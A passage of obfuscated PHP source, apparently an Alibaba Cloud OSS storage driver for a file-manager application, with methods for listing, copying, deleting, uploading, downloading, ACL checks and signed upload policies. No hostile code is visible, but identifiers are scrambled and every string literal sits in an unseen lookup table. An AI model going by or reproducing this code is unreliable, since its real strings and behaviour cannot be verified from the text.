($‡ÀÔËïú === $û‚Á²¨’[12]) { break; } } $this->cacheMethodInfoSet($ÑÕó‚, !0); return array($û‚Á²¨’[85] => $ø©œ•—Ä, $û‚Á²¨’[86] => $ØÁ‡¥š); } public function listObject($ß‚œºËò, $óÂÌÎÚÉ = '') { $ş…Øê¥€ =& $_SERVER[³à¼î¯á]; $ß‚œºËò = trim($ß‚œºËò, $ş…Øê¥€[8]); $”‚¸ò£Ñ = empty($ß‚œºËò) && $ß‚œºËò !== $ş…Øê¥€[219] ? $ş…Øê¥€[12] : $ß‚œºËò . $ş…Øê¥€[8]; $Òüõñšš = $ş…Øê¥€[12]; $®ª×—ı× = 1000; $ÇõìãŞ¿ = $ËÌªİ² = array(); while (!0) { check_abort(); $ºÙ¿Ş›Ö = array($ş…Øê¥€[1442] => $óÂÌÎÚÉ, $ş…Øê¥€[1443] => $”‚¸ò£Ñ, $ş…Øê¥€[1444] => $®ª×—ı×, $ş…Øê¥€[1445] => $Òüõñšš); try { $Ö›ÔÎşç = $this->client->listObjects($this->bucket, $ºÙ¿Ş›Ö); } catch (OSS\Core\OssException $äÆæ÷Ò) { $this->writeLog(__FUNCTION__ . $ş…Øê¥€[205] . $äÆæ÷Ò->getMessage()); break; } $Òüõñšš = $Ö›ÔÎşç->getNextMarker(); $ªˆœãè¤ = $Ö›ÔÎşç->getObjectList(); foreach ($ªˆœãè¤ as $é Ïı„‚) { if ($é Ïı„‚->getKey() == $”‚¸ò£Ñ) { continue; } $—–®‡† = $é Ïı„‚->getKey(); $ÈŸÍË‘ = $é Ïı„‚->getSize(); $ºùÀ’Ÿè = $ÈŸÍË‘ == 0 && substr($—–®‡†, strlen($—–®‡†) - 1, 1) == $ş…Øê¥€[8] ? !0 : !1; if ($ºùÀ’Ÿè) { continue; } (yield $ÈŸÍË‘ . $ş…Øê¥€[205] . $—–®‡†); } if ($Òüõñšš === $ş…Øê¥€[12]) { break; } } } public function copyFile($õ÷í¶äà, $¥¤ş¼â÷) { $÷µø¬ı“ = $this->size($õ÷í¶äà); if ($÷µø¬ı“ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $õ÷í¶äà, $this->bucket, $this->pathEncode($¥¤ş¼â÷)); } catch (OSS\Core\OssException $ôªˆ‰) { $this->writeLog(__FUNCTION__ . $_SERVER[³à¼î¯á][205] . $ôªˆ‰->getMessage()); return !1; } return $this->getPathOuter($¥¤ş¼â÷); } $â¬æóÉÕ = $this->multiCopyObject($õ÷í¶äà, $¥¤ş¼â÷, $÷µø¬ı“); return $â¬æóÉÕ ? $this->getPathOuter($¥¤ş¼â÷) : !1; } private function multiCopyObject($àÇ‰ìûï, $¤ƒ´Å¯¶, $çáîÈ¾°) { $ÄÛÌĞèĞ =& $_SERVER[³à¼î¯á]; try { $úÌÔ»¯¡ = array(); if ($†°¬³ = $this->hashMd5($àÇ‰ìûï)) { $úÌÔ»¯¡ = array(OSS\OssClient::OSS_HEADERS => array($ÄÛÌĞèĞ[1449] => $†°¬³)); } $Ï©šà›À = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($¤ƒ´Å¯¶), $úÌÔ»¯¡); $šÚÃæİÓ = 1; $àö–÷½÷ = 0; $™¿¿‹Ö = array(); $æ·±æ÷· = 1024 * 1024 * 10; $Í‚¿ı = $this->client->generateMultiuploadParts($çáîÈ¾°, $æ·±æ÷·); foreach ($Í‚¿ı as $š²‰°Ãç => $âùÏè¤‘) { $¡í„×ƒ½ = $àö–÷½÷ + (int) $âùÏè¤‘[$ÄÛÌĞèĞ[1450]]; $í¹ü´Ç‡ = (int) $âùÏè¤‘[$ÄÛÌĞèĞ[388]] + $¡í„×ƒ½ - 1; $Ó› –ğˆ = array($ÄÛÌĞèĞ[1451] => $¡í„×ƒ½, $ÄÛÌĞèĞ[1452] => $í¹ü´Ç‡); $™¿¿‹Ö[] = $this->client->uploadPartCopy($this->bucket, $àÇ‰ìûï, $this->bucket, $this->pathEncode($¤ƒ´Å¯¶), $šÚÃæİÓ, $Ï©šà›À, $Ó› –ğˆ); $šÚÃæİÓ = $šÚÃæİÓ + 1; } $›ô¸³É¦ = array(); foreach ($™¿¿‹Ö as $š²‰°Ãç => $³›İƒ³ç) { $›ô¸³É¦[] = array($ÄÛÌĞèĞ[1453] => $š²‰°Ãç + 1, $ÄÛÌĞèĞ[1454] => $³›İƒ³ç); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($¤ƒ´Å¯¶), $Ï©šà›À, $›ô¸³É¦); } catch (OSS\Core\OssException $ÍØÇ¶™©) { $this->writeLog(__FUNCTION__ . $ÄÛÌĞèĞ[205] . $ÍØÇ¶™©->getMessage()); return !1; } return !0; } public function moveFile($Ø¥©†’ş, $ó¾’£¢«) { if ($this->copyFile($Ø¥©†’ş, $ó¾’£¢«)) { $this->remove($Ø¥©†’ş); return $this->getPathOuter($ó¾’£¢«); } return !1; } public function delFile($ÉË§¥ÚÍ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ÉË§¥ÚÍ)); } catch (OSS\Core\OssException $”¾õ»ÊÉ) { $this->writeLog(__FUNCTION__ . $_SERVER[³à¼î¯á][205] . $”¾õ»ÊÉ->getMessage()); return !1; } return !0; } public function delFolder($–úªÓã) { $™¶»ƒêó =& $_SERVER[³à¼î¯á]; if (!$this->exist($–úªÓã)) { return !0; } $this->listItemCache = !1; $‹íí¼øÊ = $this->fileList($–úªÓã); $this->listItemCache = !0; $ùÑ‡´£ = trim($–úªÓã, $™¶»ƒêó[8]) . $™¶»ƒêó[8]; if (!empty($–úªÓã) && $–úªÓã !== $™¶»ƒêó[219] && !in_array($ùÑ‡´£, $‹íí¼øÊ[$™¶»ƒêó[85]])) { $‹íí¼øÊ[$™¶»ƒêó[85]][] = $ùÑ‡´£; } $¢—¿ª„Ñ = $this->delByBatch($‹íí¼øÊ[$™¶»ƒêó[86]]); if (!$¢—¿ª„Ñ) { return !1; } $¢—¿ª„Ñ = $this->delByBatch($‹íí¼øÊ[$™¶»ƒêó[85]]); if (!$¢—¿ª„Ñ) { return !1; } return $this->delFile($ùÑ‡´£); } private function delByBatch($Éî¡¹ßË) { foreach (array_chunk($Éî¡¹ßË, 1000) as $‡ûÍøÉÓ) { try { $this->client->deleteObjects($this->bucket, $‡ûÍøÉÓ); } catch (OSS\Core\OssException $ø‚şÙ) { $this->writeLog(__FUNCTION__ . $_SERVER[³à¼î¯á][205] . $ø‚şÙ->getMessage()); return !1; } } return !0; } public function rename($ğìøÎŸ¡, $Ÿ†›ˆ½­) { return $this->renameObject($ğìøÎŸ¡, $Ÿ†›ˆ½­); } private function fileInfo($ê×¦ïÕ, $æûÚ†’ã = false, $Àå©½ = array()) { $èŸûÊ­ =& $_SERVER[³à¼î¯á]; $×»ˆŒÆŸ = array($èŸûÊ­[32] => $this->pathThis($ê×¦ïÕ), $èŸûÊ­[87] => $this->getPathOuter($ê×¦ïÕ), $èŸûÊ­[33] => $èŸûÊ­[221], $èŸûÊ­[79] => isset($Àå©½[$èŸûÊ­[79]]) ? $Àå©½[$èŸûÊ­[79]] : 0, $èŸûÊ­[178] => $this->ext($ê×¦ïÕ)); if ($æûÚ†’ã) { return $×»ˆŒÆŸ; } $×»ˆŒÆŸ[$èŸûÊ­[222]] = $×»ˆŒÆŸ[$èŸûÊ­[88]] = 0; $×»ˆŒÆŸ[$èŸûÊ­[223]] = $×»ˆŒÆŸ[$èŸûÊ­[224]] = !0; if (empty($Àå©½)) { $‡çŠğ”ğ = $this->objectMeta($ê×¦ïÕ); if (!$‡çŠğ”ğ) { return $×»ˆŒÆŸ; } $Àå©½ = array($èŸûÊ­[88] => strtotime($‡çŠğ”ğ[$èŸûÊ­[1448]]), $èŸûÊ­[79] => $‡çŠğ”ğ[$èŸûÊ­[1447]] + 0, $èŸûÊ­[1446] => $‡çŠğ”ğ[$èŸûÊ­[1446]]); } if (isset($Àå©½[$èŸûÊ­[1446]]) && $Àå©½[$èŸûÊ­[1446]]) { $×»ˆŒÆŸ[$èŸûÊ­[226]] = trim($Àå©½[$èŸûÊ­[1446]], $èŸûÊ­[121]); } if (isset($Àå©½[$èŸûÊ­[79]])) { $×»ˆŒÆŸ[$èŸûÊ­[79]] = $Àå©½[$èŸûÊ­[79]]; } if (isset($Àå©½[$èŸûÊ­[88]])) { $×»ˆŒÆŸ[$èŸûÊ­[88]] = $Àå©½[$èŸûÊ­[88]]; } if (isset($Àå©½[$èŸûÊ­[197]]) && !trim($×»ˆŒÆŸ[$èŸûÊ­[88]])) { $×»ˆŒÆŸ[$èŸûÊ­[88]] = $Àå©½[$èŸûÊ­[197]]; } return $×»ˆŒÆŸ; } private function folderInfo($»…òË¥–, $Ìƒğ§¤´ = false, $¬¦ş“îÜ = array()) { $¡õËâ»‡ =& $_SERVER[³à¼î¯á]; $Ö«›€øÌ = array($¡õËâ»‡[32] => $this->pathThis($»…òË¥–), $¡õËâ»‡[87] => $this->getPathOuter($¡õËâ»‡[8] . $»…òË¥–), $¡õËâ»‡[33] => $¡õËâ»‡[78]); if ($Ìƒğ§¤´) { return $Ö«›€øÌ; } $Ö«›€øÌ[$¡õËâ»‡[222]] = $Ö«›€øÌ[$¡õËâ»‡[88]] = 0; $Ö«›€øÌ[$¡õËâ»‡[223]] = $Ö«›€øÌ[$¡õËâ»‡[224]] = !0; if (empty($¬¦ş“îÜ)) { $»…òË¥– = rtrim($»…òË¥–, $¡õËâ»‡[8]) . $¡õËâ»‡[8]; $Æî»…Î = $this->objectMeta($»…òË¥–); if (!$Æî»…Î) { return $Ö«›€øÌ; } $¬¦ş“îÜ = array($¡õËâ»‡[222] => $Æî»…Î[$¡õËâ»‡[551]][$¡õËâ»‡[1455]], $¡õËâ»‡[88] => strtotime($Æî»…Î[$¡õËâ»‡[1448]])); } if (isset($¬¦ş“îÜ[$¡õËâ»‡[88]])) { $Ö«›€øÌ[$¡õËâ»‡[88]] = $¬¦ş“îÜ[$¡õËâ»‡[88]]; } if (isset($¬¦ş“îÜ[$¡õËâ»‡[222]])) { $Ö«›€øÌ[$¡õËâ»‡[222]] = $¬¦ş“îÜ[$¡õËâ»‡[222]]; } return $Ö«›€øÌ; } public function listPath($ïÛÈ™Á†, $ÅÖ¹÷ = false) { $—¿ÂŠÙ» =& $_SERVER[³à¼î¯á]; $„†‰ï = $this->fileList($ïÛÈ™Á†, $—¿ÂŠÙ»[8], !0); foreach ($„†‰ï[$—¿ÂŠÙ»[85]] as $İ‰ĞÓà« => $×Ï†”ƒ¤) { $„†‰ï[$—¿ÂŠÙ»[85]][$İ‰ĞÓà«] = $this->folderInfo($×Ï†”ƒ¤, $ÅÖ¹÷, $×Ï†”ƒ¤); } foreach ($„†‰ï[$—¿ÂŠÙ»[86]] as $İ‰ĞÓà« => $×Ï†”ƒ¤) { $„†‰ï[$—¿ÂŠÙ»[86]][$İ‰ĞÓà«] = $this->fileInfo($×Ï†”ƒ¤[$—¿ÂŠÙ»[32]], $ÅÖ¹÷, $×Ï†”ƒ¤); } return $„†‰ï; } protected function infoChildren($Š‚ƒè×Š, &$£­¯ Àš) { $Ú”Ø˜¹ =& $_SERVER[³à¼î¯á]; $åš‘İ‹¶ = $this->fileList($Š‚ƒè×Š, $Ú”Ø˜¹[12], !0); $£­¯ Àš[$Ú”Ø˜¹[81]] += count($åš‘İ‹¶[$Ú”Ø˜¹[85]]); $£­¯ Àš[$Ú”Ø˜¹[80]] += count($åš‘İ‹¶[$Ú”Ø˜¹[86]]); foreach ($åš‘İ‹¶[$Ú”Ø˜¹[86]] as $÷İ“ÕÛâ) { if (!$÷İ“ÕÛâ || !$÷İ“ÕÛâ[$Ú”Ø˜¹[79]]) { continue; } $£­¯ Àš[$Ú”Ø˜¹[79]] += $÷İ“ÕÛâ[$Ú”Ø˜¹[79]]; } } public function has($©ığö¯ö, $ÄÄÉµŒÆ = false, $ŠÆÅóû = true) { $€øÔ÷ş‰ =& $_SERVER[³à¼î¯á]; $©ığö¯ö = trim($©ığö¯ö, $€øÔ÷ş‰[8]); $’¤£‡· = empty($©ığö¯ö) && $©ığö¯ö !== $€øÔ÷ş‰[219] ? $€øÔ÷ş‰[12] : $©ığö¯ö . $€øÔ÷ş‰[8]; $ñ ĞŞçˆ = $€øÔ÷ş‰[12]; $˜éÎ©ò¬ = 500; $ğ¥å¥®› = $ëòäì¶ª = 0; while (!0) { check_abort(); $Ã‚È·Å = array($€øÔ÷ş‰[1442] => $€øÔ÷ş‰[8], $€øÔ÷ş‰[1443] => $’¤£‡·, $€øÔ÷ş‰[1444] => $˜éÎ©ò¬, $€øÔ÷ş‰[1445] => $ñ ĞŞçˆ); try { $òÌœ™÷û = $this->client->listObjects($this->bucket, $Ã‚È·Å); } catch (OSS\Core\OssException $¶“ïÎ¥) { $this->writeLog(__FUNCTION__ . $€øÔ÷ş‰[205] . $¶“ïÎ¥->getMessage()); break; } $ñ ĞŞçˆ = $òÌœ™÷û->getNextMarker(); $€š€ø˜ = $òÌœ™÷û->getObjectList(); $Ã¯Óœ = $òÌœ™÷û->getPrefixList(); if ($ÄÄÉµŒÆ) { if (count($€š€ø˜) > 1 || count($€š€ø˜) == 1 && $€š€ø˜[0]->getKey() != $’¤£‡·) { $ğ¥å¥®› += count($€š€ø˜) - 1; } if (!empty($Ã¯Óœ)) { $ëòäì¶ª += count($Ã¯Óœ); } if ($ñ ĞŞçˆ === $€øÔ÷ş‰[12]) { break; } continue; } if ($ŠÆÅóû) { if (!empty($€š€ø˜)) { if (count($€š€ø˜) > 1 || $€š€ø˜[0]->getKey() != $’¤£‡·) { return !0; } } } else { if (!empty($Ã¯Óœ)) { return !0; } } if ($ñ ĞŞçˆ === $€øÔ÷ş‰[12]) { break; } } if ($ÄÄÉµŒÆ) { return array($€øÔ÷ş‰[230] => $ğ¥å¥®›, $€øÔ÷ş‰[231] => $ëòäì¶ª); } return !1; } public function listAll($Ì•õßˆÚ) { $¥˜ÌÏï› =& $_SERVER[³à¼î¯á]; $«Âôë†î = $this->fileList($Ì•õßˆÚ, $¥˜ÌÏï›[12], !0); $“àñÛüÃ = array_to_keyvalue($«Âôë†î[$¥˜ÌÏï›[86]], $¥˜ÌÏï›[32]); foreach ($«Âôë†î[$¥˜ÌÏï›[85]] as $šÇÇÊ÷») { if (is_string($šÇÇÊ÷»)) { $“àñÛüÃ[$šÇÇÊ÷»] = array($¥˜ÌÏï›[79] => 0); } } return $this->listAllFiles($Ì•õßˆÚ, $“àñÛüÃ); } public function canRead($¨ø‡öÀ™) { $¼ôì‘›Õ =& $_SERVER[³à¼î¯á]; $‚İœúˆ’ = $this->pathAcl($¨ø‡öÀ™); return $‚İœúˆ’ == $¼ôì‘›Õ[1456] || $‚İœúˆ’ == $¼ôì‘›Õ[594] ? !0 : !1; } public function canWrite($Ò·Ÿæ¬Ü) { $»ê°£‚ = $this->pathAcl($Ò·Ÿæ¬Ü); return $»ê°£‚ == $_SERVER[³à¼î¯á][594] ? !0 : !1; } public function pathAcl($Šøâ–¬§) { $Í®¦öøÍ =& $_SERVER[³à¼î¯á]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $¹ôÔÌ™© = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Šøâ–¬§)); } catch (OSS\Core\OssException $í–¨õ) { $this->writeLog(__FUNCTION__ . $Í®¦öøÍ[205] . $í–¨õ->getMessage()); return !1; } $ëšÏ‡†² = $¹ôÔÌ™© == $Í®¦öøÍ[37] ? $this->bucketAcl : $¹ôÔÌ™©; if ($ëšÏ‡†² == $Í®¦öøÍ[1457]) { return $Í®¦öøÍ[1456]; } if ($ëšÏ‡†² == $Í®¦öøÍ[1458]) { return $Í®¦öøÍ[594]; } return $ëšÏ‡†²; } private function chmodPath($›ûÑ§¤†, $Ä¥ÑŒ¡• = '') { $¸ßƒË¦â =& $_SERVER[³à¼î¯á]; $‹Ô²Ì’á = empty($Ä¥ÑŒ¡•) ? $¸ßƒË¦â[1458] : $Ä¥ÑŒ¡•; $ÌÂó–Ü† = array($¸ßƒË¦â[37], $¸ßƒË¦â[220], $¸ßƒË¦â[1457], $¸ßƒË¦â[1458]); if (!in_array($‹Ô²Ì’á, $ÌÂó–Ü†)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($›ûÑ§¤†), $‹Ô²Ì’á); } catch (OSS\Core\OssException $¯ÏıÆÌ) { $this->writeLog(__FUNCTION__ . $¸ßƒË¦â[205] . $¯ÏıÆÌ->getMessage()); return !1; } return !0; } public function getContent($–ë‰±”§) { return $this->fileSubstr($–ë‰±”§, -1); } public function setContent($ÂÓä¼²á, $‰Úø›à = '') { $Š×·üé× =& $_SERVER[³à¼î¯á]; try { $Û°¸»¯Ù = $this->trafficLimit($Š×·üé×[1459]); $Øêìé¹ = $this->client->putObject($this->bucket, $this->pathEncode($ÂÓä¼²á), $‰Úø›à, $Û°¸»¯Ù); } catch (OSS\Core\OssException $ƒÜ¥Ğº) { $this->writeLog(__FUNCTION__ . $Š×·üé×[205] . $ƒÜ¥Ğº->getMessage()); return !1; } $º‚û§šª = array($Š×·üé×[1449] => trim($Øêìé¹[$Š×·üé×[1446]], $Š×·üé×[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ÂÓä¼²á))); $this->updateObjMeta($ÂÓä¼²á, $º‚û§šª); return isset($Øêìé¹[$Š×·üé×[1460]][$Š×·üé×[283]]) ? !0 : !1; } private function updateObjMeta($‘‹ıÌÌ, $‘½À°¼) { $‘‹ıÌÌ = $this->pathEncode($‘‹ıÌÌ); try { $½îí¤êœ = array(OSS\OssClient::OSS_HEADERS => $‘½À°¼); $this->client->copyObject($this->bucket, $‘‹ıÌÌ, $this->bucket, $‘‹ıÌÌ, $½îí¤êœ); } catch (OSS\Core\OssException $š­İÜ­×) { $this->writeLog(__FUNCTION__ . $_SERVER[³à¼î¯á][205] . $š­İÜ­×->getMessage()); return !1; } return !0; } public function upload($±ÜËÎ£, $¤è¨í˜Ã, $’¸şÄ¿â = false, $Â±´ã½´ = REPEAT_REPLACE) { $’ÖÈ‚’ã =& $_SERVER[³à¼î¯á]; $‡“—¹Ê = trim($±ÜËÎ£, $’ÖÈ‚’ã[8]); $Ó¢ÜÑ˜¼ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($’ÖÈ‚’ã[1449] => @md5_file($¤è¨í˜Ã)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($±ÜËÎ£))); $Ó¢ÜÑ˜¼ = $this->trafficLimit($’ÖÈ‚’ã[1459], $Ó¢ÜÑ˜¼); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($‡“—¹Ê), $¤è¨í˜Ã, $Ó¢ÜÑ˜¼); } catch (OSS\Core\OssException $¼ÃÕøç™) { $this->writeLog(__FUNCTION__ . $’ÖÈ‚’ã[205] . $¼ÃÕøç™->getMessage()); return !1; } return $this->getPathOuter($±ÜËÎ£); } public function getHost() { $’›“Ğ‰ =& $_SERVER[³à¼î¯á]; $„²‘«ÈÃ = explode($’›“Ğ‰[201], parent::getHost()); return $„²‘«ÈÃ[0] . $’›“Ğ‰[201] . $this->bucket . $’›“Ğ‰[10] . $„²‘«ÈÃ[1]; } public function uploadFormData($íéãÏÊû, $Ûı¹â† = 3600) { $íÛç±Ø† =& $_SERVER[³à¼î¯á]; if (!($ôåÖÓ‰Ş = $this->getHost())) { return !1; } $Ü¥İÊµ­ = $Ûı¹â†; $Ï”ÇÙ‰¶ = date($íÛç±Ø†[1461], time() + $Ü¥İÊµ­); $†ÁÖ·Ä = new DateTime($Ï”ÇÙ‰¶); $ßğï¡Ï = $†ÁÖ·Ä->format(DateTime::ISO8601); $œƒºÆ´ = strpos($ßğï¡Ï, $íÛç±Ø†[347]); $ßğï¡Ï = substr($ßğï¡Ï, 0, $œƒºÆ´) . $íÛç±Ø†[1462]; $ôå˜Ñ¥§ = 1048576000 * 5; $Õà˜…çÔ = $this->pathFather($íéãÏÊû); $Û¦Ó§¨ = array($íÛç±Ø†[266] => $ßğï¡Ï, $íÛç±Ø†[269] => array(array($íÛç±Ø†[1463], 0, $ôå˜Ñ¥§), array($íÛç±Ø†[272], $íÛç±Ø†[273], $Õà˜…çÔ))); $Í¹ î‘ = base64_encode(json_encode($Û¦Ó§¨)); $Ñå—¡É¯ = base64_encode(hash_hmac($íÛç±Ø†[254], $Í¹ î‘, $this->secret, !0)); $áö‰Üï€ = array($íÛç±Ø†[284] => $Í¹ î‘, $íÛç±Ø†[1464] => $this->accessKey, $íÛç±Ø†[276] => $íÛç±Ø†[265], $íÛç±Ø†[1465] => $Ñå—¡É¯, $íÛç±Ø†[199] => $ôåÖÓ‰Ş); $áö‰Üï€ = $this->trafficLimit($íÛç±Ø†[1459], $áö‰Üï€); return $áö‰Üï€; } public function multiUploadFormData($¿À‚¶›€, $Á¿ª¾š = 3600) { $¶Ûîãè• =& $_SERVER[³à¼î¯á]; if (!($Ôö‘‹È§ = $this->getHost())) { return !1; } $–ßûè¡â = $this->trafficLimit($¶Ûîãè•[1459]); $°õö¨Š  = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($¿À‚¶›€), $–ßûè¡â); return array($¶Ûîãè•[245] => $°õö¨Š , $¶Ûîãè•[199] => $Ôö‘‹È§ . $¶Ûîãè•[8] . $this->pathEncode($¿À‚¶›€), $¶Ûîãè•[246] => gmdate($¶Ûîãè•[1466]), $¶Ûîãè•[97] => $¿À‚¶›€); } public function multiUploadAuthData($†²¡éÁâ, $¢£ÊşÃ¹ = array()) { $ğìúÕİ» =& $_SERVER[³à¼î¯á]; $æÏ‰ÏÊ½ = isset($¢£ÊşÃ¹[$ğìúÕİ»[246]]) ? $¢£ÊşÃ¹[$ğìúÕİ»[246]] : gmdate($ğìúÕİ»[1466]); $î‚£ß× = isset($¢£ÊşÃ¹[$ğìúÕİ»[178]]) ? $¢£ÊşÃ¹[$ğìúÕİ»[178]] : $ğìúÕİ»[12]; $±ì¦·ëí = $†²¡éÁâ; if (isset($¢£ÊşÃ¹[$ğìúÕİ»[97]])) { $±ì¦·ëí = $¢£ÊşÃ¹[$ğìúÕİ»[97]]; unset($¢£ÊşÃ¹[$ğìúÕİ»[97]]); } if (isset($¢£ÊşÃ¹[$ğìúÕİ»[247]])) { $¢£ÊşÃ¹[$ğìúÕİ»[246]] = $æÏ‰ÏÊ½; return $this->listUploadParts($±ì¦·ëí, $¢£ÊşÃ¹); } $˜¯ÌÎàß = array($ğìúÕİ»[248], $ğìúÕİ»[12], $ğìúÕİ»[123], $æÏ‰ÏÊ½, "\170\55\x6f\163\163\x2d\x64\141\164\x65\72{$æÏ‰ÏÊ½}", $ğìúÕİ»[8] . $this->bucket . $ğìúÕİ»[8] . $±ì¦·ëí . $î‚£ß×); if (strpos($î‚£ß×, $ğìúÕİ»[249]) === 0) { $˜¯ÌÎàß[0] = $ğìúÕİ»[250]; if ($ğ²§ºüÇ = $this->trafficLimit($ğìúÕİ»[1459])) { $±ì¦·ëí = $ğìúÕİ»[1467]; array_splice($˜¯ÌÎàß, 5, 0, $±ì¦·ëí . $ğìúÕİ»[4] . $ğ²§ºüÇ[$±ì¦·ëí]); } } if (isset($¢£ÊşÃ¹[$ğìúÕİ»[251]]) && $¢£ÊşÃ¹[$ğìúÕİ»[251]] == $ğìúÕİ»[252]) { $˜¯ÌÎàß[0] = $ğìúÕİ»[252]; } if (!empty($¢£ÊşÃ¹[$ğìúÕİ»[1468]])) { $Ö»Ëí = array_merge(array($˜¯ÌÎàß[4]), $¢£ÊşÃ¹[$ğìúÕİ»[1468]]); sort($Ö»Ëí); $˜¯ÌÎàß[4] = implode($ğìúÕİ»[253], $Ö»Ëí); } $Éâ¶ª®® = implode($ğìúÕİ»[253], $˜¯ÌÎàß); $ÓóÄ¢÷ = base64_encode(hash_hmac($ğìúÕİ»[254], $Éâ¶ª®®, $this->secret, !0)); $¿ö¯Ğšª = $ğìúÕİ»[1432] . $this->accessKey . $ğìúÕİ»[4] . $ÓóÄ¢÷; if (strpos($î‚£ß×, $ğìúÕİ»[249]) === 0) { $¿ö¯Ğšª = array($ğìúÕİ»[256] => $¿ö¯Ğšª, $ğìúÕİ»[246] => $æÏ‰ÏÊ½); if ($ğ²§ºüÇ) { $¿ö¯Ğšª = array_merge($¿ö¯Ğšª, $ğ²§ºüÇ); } } return $¿ö¯Ğšª; } public function listUploadParts($ÒŒ’ î, $Ñ€í¯ÖÚ) { $…¡ÛîÀ =& $_SERVER[³à¼î¯á]; $‹Ãú– = parse_url_query($Ñ€í¯ÖÚ[$…¡ÛîÀ[178]]); $ŞòÇÆú® = $this->client->listParts($this->bucket, $this->pathEncode($ÒŒ’ î), $‹Ãú–[$…¡ÛîÀ[245]]); $»Ú¯²ª× = $ŞòÇÆú®->getListPart(); $²ÎÊáãâ = array(); foreach ($»Ú¯²ª× as $Í®Íæåä) { $²ÎÊáãâ[] = array($…¡ÛîÀ[1453] => $Í®Íæåä->getPartNumber(), $…¡ÛîÀ[1454] => trim($Í®Íæåä->getETag(), $…¡ÛîÀ[121])); } unset($Ñ€í¯ÖÚ[$…¡ÛîÀ[247]], $Ñ€í¯ÖÚ[$…¡ÛîÀ[251]]); $¥ôøô° = $this->multiUploadAuthData($ÒŒ’ î, $Ñ€í¯ÖÚ); if (empty($¥ôøô°)) { return !1; } return array($…¡ÛîÀ[256] => $¥ôøô°, $…¡ÛîÀ[246] => $Ñ€í¯ÖÚ[$…¡ÛîÀ[246]], $…¡ÛîÀ[258] => $²ÎÊáãâ); } public function download($åî’»°Ù, $·¨ùè—) { $å¿î¬²û =& $_SERVER[³à¼î¯á]; if ($this->isFolder($åî’»°Ù)) { return !1; } try { $Ê›¨†¹ó = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $·¨ùè—); $Ê›¨†¹ó = $this->trafficLimit($å¿î¬²û[112], $Ê›¨†¹ó); $this->client->getObject($this->bucket, $this->pathEncode($åî’»°Ù), $Ê›¨†¹ó); } catch (OSS\Core\OssException $÷Î¾ˆ‘Ê) { $this->writeLog(__FUNCTION__ . $å¿î¬²û[205] . $÷Î¾ˆ‘Ê->getMessage()); return !1; } return $·¨ùè—; } public function fileSubstr($˜¾İ—º, $Ê”ƒÂø = 0, $ëÉ×£÷ú = false) { if ($Ê”ƒÂø === -1) { $ìõé‹šµ = array(); } else { if ($ëÉ×£÷ú === !1) { $¯£—Î¾• = $this->size($˜¾İ—º); } else { $¯£—Î¾• = $Ê”ƒÂø + $ëÉ×£÷ú - 1; } $ìõé‹šµ = array(OSS\OssClient::OSS_RANGE => "{$Ê”ƒÂø}\55{$¯£—Î¾•}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($˜¾İ—º), $ìõé‹šµ); } catch (OSS\Core\OssException $µà¨¼Æœ) { $this->writeLog(__FUNCTION__ . $_SERVER[³à¼î¯á][205] . $µà¨¼Æœ->getMessage()); think_exception($µà¨¼Æœ->getMessage()); return !1; } } private function trafficLimit($şŸÊûì§, $ÆÎôùÕˆ = array()) { $ì’À¨İ½ =& $_SERVER[³à¼î¯á]; if ($şŸÊûì§ == $ì’À¨İ½[1459] && $this->isUploadServer() || $şŸÊûì§ == $ì’À¨İ½[112] && $this->isFileOutServer()) { return $ÆÎôùÕˆ; } $İˆğ„ÈÔ = floatval($GLOBALS[$ì’À¨İ½[6]][$ì’À¨İ½[92]][$ì’À¨İ½[110]][$şŸÊûì§]) * 1024 * 1024 * 8; if (!$İˆğ„ÈÔ) { return $ÆÎôùÕˆ; } $İˆğ„ÈÔ = $İˆğ„ÈÔ < 819200 ? 819200 : ($İˆğ„ÈÔ > 838860800 ? 838860800 : $İˆğ„ÈÔ); $ÆÎôùÕˆ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($İˆğ„ÈÔ); return $ÆÎôùÕˆ; } public function link($êÃâİ³ö, $Ñ™ò†û = array()) { $õıÛˆØÀ =& $_SERVER[³à¼î¯á]; if (!$this->exist($êÃâİ³ö) || $this->isFolder($êÃâİ³ö)) { return !1; } try { $Ñ™ò†û = $this->trafficLimit($õıÛˆØÀ[112], $Ñ™ò†û); $şÅ±œÈ‡ = $this->client->signUrl($this->bucket, $this->pathEncode($êÃâİ³ö), 3600 * 12, $õıÛˆØÀ[252], $Ñ™ò†û); return $this->getCdnLink($şÅ±œÈ‡); } catch (OSS\Core\OssException $¿Úãıµ) { $this->writeLog(__FUNCTION__ . $õıÛˆØÀ[205] . $¿Úãıµ->getMessage()); return !1; } } public function fileOut($¨Ü†ñ–, $˜œ­‘Şî = false, $‡äÆìä = false, $¯ü¯ÅÆ˜ = '') { $ìêôØé§ =& $_SERVER[³à¼î¯á]; if ($this->isFileOutServer()) { return $this->fileOutServer($¨Ü†ñ–, $˜œ­‘Şî, $‡äÆìä, $¯ü¯ÅÆ˜); } if (!$‡äÆìä) { $‡äÆìä = $this->pathThis($¨Ü†ñ–); } $‡äÆìä = rawurlencode($‡äÆìä); $À¦ãÈã = get_file_mime(get_path_ext($‡äÆìä)); if ($À¦ãÈã == $ìêôØé§[239]) { return parent::fileOut($¨Ü†ñ–, $˜œ­‘Şî, $‡äÆìä, $¯ü¯ÅÆ˜); } $˜œ­‘Şî = $˜œ­‘Şî ? $ìêôØé§[1469] : $ìêôØé§[1470]; $›ø²·€Ì = array(OSS\OssClient::OSS_SUB_RESOURCE => $ìêôØé§[1471] . rawurlencode("{$˜œ­‘Şî}\73\x66\151\x6c\145\156\x61\155\x65\75{$‡äÆìä}")); 